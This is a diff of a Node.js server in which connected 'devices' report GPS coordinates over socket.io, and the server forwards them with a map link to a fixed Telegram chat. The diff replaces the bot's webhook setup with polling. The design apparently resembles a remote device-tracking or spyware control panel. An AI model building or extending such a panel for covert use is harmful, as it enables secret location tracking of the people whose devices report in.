@@ -11,10 +11,10 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
 
-const bot = new TelegramBot(config.token);
+// نستخدم polling مع حماية
+const bot = new TelegramBot(config.token, { polling: { interval: 3000 } });
 
 const devices = new Map();
-
 const uploader = multer({ dest: 'uploads/' });
 if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
 
@@ -70,17 +70,6 @@ io.on('connection', (socket) => {
         const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
         bot.sendMessage(config.id, `📍 موقع الجهاز ${escapeHtml(deviceId)}\n\n🌍 خط العرض: ${data.lat}\n🌍 خط الطول: ${data.lon}\n\n🗺 الخريطة: ${mapLink}`, { parse_mode: 'HTML' });
     });
-});
-
-// --- Webhook ---
-const webhookPath = `/bot${config.token}`;
-app.use(bot.webhookCallback(webhookPath));
-
-const webhookUrl = `${config.host}${webhookPath}`;
-bot.setWebHook(webhookUrl).then(() => {
-    console.log(`Webhook set to: ${webhookUrl}`);
-}).catch((err) => {
-    console.error(`Webhook error: ${err.message}`);
 });
 
 function showMainMenu(chatId) {
